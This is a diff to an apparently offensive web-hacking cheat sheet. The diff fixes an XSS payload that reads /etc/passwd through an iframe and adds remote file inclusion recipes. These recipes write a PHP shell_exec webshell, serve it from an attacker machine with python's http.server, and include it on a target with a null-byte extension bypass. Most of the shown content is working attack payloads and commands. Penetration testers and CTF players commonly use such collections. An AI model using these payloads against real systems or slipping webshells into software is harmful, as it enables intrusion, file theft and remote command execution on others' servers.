@@ -20,6 +20,7 @@
 - [Hash Length Extension Attack](#hash-length-extension-attack)
 - [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
 - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
+- [Path Normalization](#path-normalization)
 - [Unrestricted File Upload Bypass](#unrestricted-file-upload-bypass)
 - [SQL Injection (SQLI)](#waf-detection)
 - [NoSQL Injection (NoSQLI)](#nosql-injection-nosqli)
@@ -350,7 +351,7 @@ https://malwaredecoder.com/
 ### XSS to LFI
 ```
 <img src=x onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
-<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
 ```
 	
 ### XSS - Session Hijacking
@@ -823,8 +824,18 @@ python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a
 https://github.com/hansmach1ne/lfimap  
 
 ## Remote File Inclusion (RFI)
+### RFI to Webshell with null byte for image extension bypass
 ```
 echo "<?php echo shell_exec($_GET['cmd']); ?>" > evil.txt
+python -m http.server 80
+```
+```
+http://site.com/menu.php?file=http://<IP>/evil.php%00.png
+```
+
+### RFI to Webshell with txt
+```
+echo '<?php echo shell_exec($_GET["cmd"]); ?>' > evil.txt
 python -m http.server 80
 ```
 ```
